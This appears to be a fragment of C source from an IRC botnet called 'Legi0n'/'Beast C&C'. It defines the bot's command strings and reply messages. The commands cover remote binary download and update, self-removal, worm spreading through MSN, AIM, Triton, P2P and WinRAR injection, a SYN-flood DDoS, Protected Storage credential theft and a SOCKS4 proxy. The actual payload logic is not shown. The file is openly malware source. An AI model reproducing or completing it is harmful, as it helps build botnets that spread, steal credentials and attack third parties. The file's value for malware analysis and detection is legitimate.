

///////////////////////////////////////////////
//               Commands                     /
//////////////////////////////////////////////





/////////////BASIC/////////////

const char get_auth[]			= "Admin"; 
const char cmd_join[]			= "goto";  
const char cmd_part[]			= "part";  
const char get_mnd[]			= "dl.start"; 
const char cmd_dlstop[]			= "dl.stop";  
const char get_upd[]			= "updatebin";	  
const char cmd_remove[]			= "selfterminate";	  
/////////////SPREADS///////////
const char cmd_msnspam[]		= "msn.msg";        
const char cmd_msnemail[]		= "msn.msgemail";   
const char cmd_msnstop[]		= "msn.stop";		
const char cmd_msnsendzip[]		= "msn.sendzip";    
const char cmd_msnstopzip[]		= "msn.stopzip";	
const char cmd_timspread_1[]    = "triton.msg";		
const char cmd_timspread_2[]    = "triton.stop";
const char cmd_aimspread_1[]    = "aim.msg";		
const char cmd_aimspread_2[]    = "aim.stop";
const char cmd_winrar[]		    = "rarinject";		
const char cmd_p2pspread[]      = "p2p";			
/////////////OTHER////////////
const char cmd_ddos_1[]	        = "supersyn";		
const char cmd_ddos_2[]	        = "supersyn.stop";	
const char cmd_pstore_2[]	= "pstore.search";	
const char cmd_pstore_3[]	= "pstore.stop";	
const char cmd_socks4[]	        = "socks4";			
const char cmd_pstore_1[]	    = "pstore";
#ifndef NO_VISIT
const char cmd_visit[]		= "visit";
#endif
const char cmd_seed[]			= "seed.utorrent";
#ifndef NO_BROWSERVISIT
const char cmd_browser[] ="browser";
#endif
///////////////////////////////


// Fake commands (who needs this shit? learn to secure your botnet!)
const char cmd_fakelogin[]		= "login";
const char cmd_fake_remove[]    = "remove";
const char cmd_fakedownload[]   = "download";
const char cmd_fakeupdate[]     = "update";
///////////////////////////////

// Command Titles
char main_title[]		= "[Legi0n]:";
char threads_title[]	= "[Thread]:";
char process_title[]	= "[Proc]:";
char irc_title[]		= "[Irc]:";
char update_title[]		= "[Update]:";
char download_title[]	= "[Dl]:";
char btkill_title[]		= "[BtKill]:";
char sock4_title[]		= "[Sock4]:";
char ddos_title[]		= "[DDOS SYN]:";
char imspread_title[]	= "[IM]:";
char aimspread_title[]  = "[Aim]:";
char timspread_title[]	= "[Triton]:";
char seed_title[]		= "[Seed]:";
char pstore_title[]		= "[Pstore]:";

char visit_title[]	= "[Visit]";

///////////////////////////////
// Strings
char str_auth_good[]	= "%s Welcome to Beast C&C";
char str_auth_full[]	= "%s Fail.";
char str_thread_alr[]	= "%s %s already running: <%d>";
char str_thread_fail[]	= "%s Fail start %s, err: <%d>";
char str_kick_msg[]		= "Fuck you %s :P";
char str_auth_ali[]		= "%s logged in.";
char str_quit_rem[]		= "[Remove]: Removed by: %s!%s@%s.";
char str_noadvapi[]		= "%s Advapidll Failed.";
char str_nopstore[]		= "%s PStoredll Failed.";
char str_main_thread[]	= "%s Main thread.";
char str_bad_format[]	= "%s mis param.";
char str_msn_msg[]		= "[Msn]: Message sent.";
char str_quit_upd[]		= "[Update]: Updating to new bin.";
///////////////////////////////